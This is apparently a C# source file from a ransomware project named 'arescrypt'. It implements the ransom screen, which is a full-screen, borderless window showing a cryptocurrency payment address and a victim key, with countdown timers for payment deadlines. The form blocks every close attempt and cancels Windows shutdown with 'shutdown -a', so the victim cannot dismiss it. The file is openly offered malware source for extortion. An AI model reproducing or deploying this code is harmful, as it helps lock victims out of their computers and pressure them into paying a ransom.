using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace arescrypt
{
    public partial class Display : Form
    {

        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwflag);
        static Configuration config = new Configuration();
        static UserData userData = new UserData();

        public Display() {
            InitializeComponent();

            // Make configurations, as required
            if (!config.sandBox) // == false
            {   // This will maximize the screen, and eliminate the taskbar. 
                this.WindowState = FormWindowState.Maximized;
                this.FormBorderStyle = FormBorderStyle.None;
            }

            this.cryptoAddress.Text = config.cryptoAddress;
            this.uniqueKeyDisplay.Text = userData.getUniqueKey();
        }        
        
        private void lostTimer_Tick(object sender, EventArgs e)
        {
            string lostTimer_Hours_Text = config.lostTimer_Hours.ToString();
            string lostTimer_Minutes_Text = config.lostTimer_Minutes.ToString();
            string lostTimer_Seconds_Text = config.lostTimer_Seconds.ToString();

            if (config.lostTimer_Minutes == 0x0 && config.lostTimer_Seconds == 0x0)
            {
                config.lostTimer_Hours--; // Decrement 'Hours' variable
                config.lostTimer_Minutes = 0x3B; // 60
                config.lostTimer_Seconds = 0x3C;
            }
            else if (config.lostTimer_Seconds == 0x0)
            {
                config.lostTimer_Minutes--;
                config.lostTimer_Seconds = 0x3B;
            }

            config.lostTimer_Seconds--;
            if (lostTimer_Hours_Text.Length == 1)
                lostTimer_Hours_Text = 0x0.ToString() + lostTimer_Hours_Text;
            if (lostTimer_Minutes_Text.Length == 1)
                lostTimer_Minutes_Text = 0x0.ToString() + lostTimer_Minutes_Text;
            if (lostTimer_Seconds_Text.Length == 1)
                lostTimer_Seconds_Text = 0x0.ToString() + lostTimer_Seconds_Text;

            paymentTimer_Lost.Text = lostTimer_Hours_Text + ":" + lostTimer_Minutes_Text + ":" + lostTimer_Seconds_Text;
        }
        
        private void riseTimer_Tick(object sender, EventArgs e)
        {
            string riseTimer_Hours_Text = config.riseTimer_Hours.ToString();
            string riseTimer_Minutes_Text = config.riseTimer_Minutes.ToString();
            string riseTimer_Seconds_Text = config.riseTimer_Seconds.ToString();

            if (config.riseTimer_Minutes == 0x0 && config.riseTimer_Seconds == 0x0)
            {
                config.riseTimer_Hours--; // Decrement 'Hours' variable
                config.riseTimer_Minutes = 0x3B; // 60
                config.riseTimer_Seconds = 0x3C; // 59
            } else if (config.riseTimer_Seconds == 0x0)
            {
                config.riseTimer_Minutes--;
                config.riseTimer_Seconds = 60;
            }

            config.riseTimer_Seconds--;

            if (riseTimer_Hours_Text.Length == 1)
                riseTimer_Hours_Text = 0x0.ToString() + riseTimer_Hours_Text;
            if (riseTimer_Minutes_Text.Length == 1)
                riseTimer_Minutes_Text = 0x0.ToString() + riseTimer_Minutes_Text;
            if (riseTimer_Seconds_Text.Length == 1)
                riseTimer_Seconds_Text = 0x0.ToString() + riseTimer_Seconds_Text;
            
            paymentTimer_Rise.Text = riseTimer_Hours_Text + ":" + riseTimer_Minutes_Text + ":" + riseTimer_Seconds_Text;
        }

        private void preventClose(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            if (e.CloseReason == CloseReason.WindowsShutDown)
                Process.Start("shutdown", "-a");
        }

        private void aboutBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { MessageBox.Show("Learn more about Bitcoin at [https://bitcoin.org/]"); } // Process.Start("https://bitcoin.org"); }

        private void aboutLitecoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { MessageBox.Show("Learn more about Litecoin at [https://litecoin.com/]"); } // Process.Start("https://litecoin.com/"); }

        private void aboutZcash_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        { MessageBox.Show("Learn more about Zcash at [https://z.cash/]"); } // Process.Start("https://z.cash/"); }
    }
}
